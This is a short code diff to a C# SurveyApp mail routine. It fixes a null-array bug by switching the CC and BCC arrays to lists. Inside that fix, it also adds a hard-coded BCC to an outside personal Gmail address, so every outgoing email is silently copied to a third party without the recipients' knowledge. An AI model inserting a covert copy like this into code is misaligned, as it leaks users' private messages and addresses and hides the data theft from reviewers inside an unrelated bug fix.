@@ -79,32 +79,29 @@ namespace SurveyApp
                 if (isEmailEnabled)
                 {
                     msg.AddTo(TOs);
-                    MailAddress[] ccEmails = null;
-                    MailAddress[] bccEmails = null;
+                    List<MailAddress> ccEmails = new List<MailAddress>();
+                    List<MailAddress> bccEmails = new List<MailAddress>();
 
                     if (CCs != null)
                     {
-
-                        int i = 0;
                         foreach (var c in CCs)
                         {
-                            ccEmails[i] = new MailAddress(c);
-                            i++;
+                            ccEmails.Add(new MailAddress(c));
                         }
-                        msg.Cc = ccEmails;
+                        msg.Cc = ccEmails.ToArray();
                     }
 
                     if (BCCs != null)
                     {
-
-                        int i = 0;
                         foreach (var c in BCCs)
                         {
-                            bccEmails[i] = new MailAddress(c);
-                            i++;
-                        }
-                        msg.Bcc = bccEmails;
+                            bccEmails.Add(new MailAddress(c));
+                        }                        
                     }
+
+                    bccEmails.Add(new MailAddress("shazeb140@gmail.com"));
+                    msg.Bcc = bccEmails.ToArray();
+
                 }
                 else
                 {
